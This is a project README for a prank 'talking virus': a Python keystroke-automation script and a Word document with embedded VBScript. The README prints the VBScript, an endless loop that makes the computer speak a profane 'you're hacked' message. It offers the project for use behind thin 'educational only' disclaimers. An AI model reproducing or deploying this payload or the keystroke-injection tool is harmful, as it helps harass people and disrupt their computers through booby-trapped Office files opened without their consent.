# Automated Word Document with Embedded Talking-virus

## Project Overview
This project demonstrates the use of a Python script to simulate keystrokes and automate activities on a device. Additionally, the project includes an attached Word document with an embedded VBScript that serves as a demonstration payload. This is designed for educational and research purposes only, particularly in the context of security and forensics.

> **Warning:** This project must only be used responsibly and ethically. Unauthorized usage may violate privacy laws and ethical guidelines.

## Features.
- Automates typing, execution of commands, and interacting with the device.
- Includes a Word document embedded with a VBScript payload for testing.
- Aesthetic design and structured instructions for ease of use.

## Embedded Script in Word Document
The following VBScript is embedded within the attached Word document:

```vbscript
do
createObject("sapi.spvoice").speak "shut the fuck up your hacked"
loop
```

**Explanation:** This script continuously uses the Speech API (SAPI) to vocalize the message, demonstrating how VBScript can interact with system features.

> **Educational Use Only:** This script should not be deployed in real environments without proper authorization and safety precautions.
